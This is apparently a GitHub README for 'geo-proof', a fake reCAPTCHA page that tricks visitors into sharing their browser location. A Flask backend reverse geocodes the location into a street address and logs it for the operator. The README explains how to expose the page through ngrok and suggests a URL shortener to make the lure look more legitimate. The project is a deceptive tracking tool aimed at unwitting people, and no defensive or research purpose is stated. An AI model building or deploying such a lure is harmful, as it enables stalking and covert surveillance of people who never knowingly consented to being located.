# geo-proof
Fake reCAPTCHA that asks for location, sends GPS coords to a Flask backend, reverse geocodes it, and stores the latest result.

## How it works

1. User opens the page (`index.html`).
2. They click the checkbox ("I'm not a robot").
3. Browser asks for location permission.
4. If allowed:
   - The page grabs latitude, longitude, and accuracy (in meters).
   - It sends that data to the backend (`/report_location`).
5. The backend reverse geocodes that into a real address (street / area / city) and writes it to `last_location.json`.
6. You (admin) can check the latest captured location by calling `/last`.

Checkbox turns green = location captured and logged.

## Project structure

```text
.
├─ index.html           # Frontend UI (fake captcha + geolocation sender)
├─ server.py            # Flask server (API + reverse geocoding + storage)
└─ last_location.json   # Latest saved location info (auto-written)

how to run : 

1. run server.py
2. run ngrok config add-authtoken "your config from ngrok website"
3. run "ngrok http 5000" in terminal / cmd
4. your ngrok public link ready (you can add url shortner to make it more legit :p) 

